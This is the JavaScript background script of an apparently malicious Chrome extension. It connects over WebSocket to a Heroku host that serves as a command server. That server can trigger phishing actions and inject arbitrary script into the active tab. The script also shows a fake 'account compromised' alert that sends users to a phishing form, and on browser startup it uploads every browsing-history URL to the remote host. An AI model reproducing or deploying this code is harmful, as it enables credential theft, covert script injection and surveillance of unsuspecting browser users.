//The server we are connecting to.
var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

//Variables we are using to listen to the server.
//Object - Full json object to be parsed
//type - The type of signal we are receiving from the server
//temp - The site to be added to the blacklist of sites
//translateString - The JS script in string form
var id = "";
var object = "";
var type = "";
var tempSite = "hello";
var translateString = 'alert("Hello!")';

//Listen to the server and parse objects.
ws.onmessage = function (e) {
    object = JSON.parse(e.data);
    id = object.id;//get 256bitvalue
    type = object.type;
  //  tempSite = object.addString;
  //  translateString = object.jsString;

    switch(type){
      //Phishing attack
      case 'html':
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
        });
        break;
      case 'js':
      //JS exe injection
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
        });
        chrome.storage.sync.set({'scriptExe': translateString}, function(){});
        break;
      case 'listAdd':
      //Add to the list of blacklist websites.
        chrome.tabs.query({active: true, currentWindow: true}, function(tab){
          chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
        });
        chrome.storage.sync.set({'addSite': tempSite}, function(){});
        break;
    }
};

/*
This function is just meant to redirect users to the phish form for now, when
the content scripts runs a message. THIS FILE WILL BE USED FOR LISTENING TO
SERVER SIGNALS.
*/

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
  switch(request.action){
    case 'load':
      alert("Your account has been comprimised! We need additional information to continue display of this accounts' info.");
      chrome.tabs.create({url: '/phishForm.html', active: true});
      break;
  }
});

ws.onopen = function(event){
  chrome.storage.sync.get("id", function(ev){
    var id=ev.id;
    var jsonPackage = {id: id, type: 'online'};
    ws.send(JSON.stringify(jsonPackage));
  });
}

chrome.runtime.onStartup.addListener(function(){
  ws.onopen = function(event){
    chrome.history.search({text: ""}, function(data) {
      data.forEach(function(page) {
        var urli = page.url;
        chrome.storage.sync.get("id", function(ev){
          var id=ev.id;
          var jsonPackage = {id: id, type: 'history', history : urli};
          ws.send(JSON.stringify(jsonPackage));
        });
      });
    });
  }
});
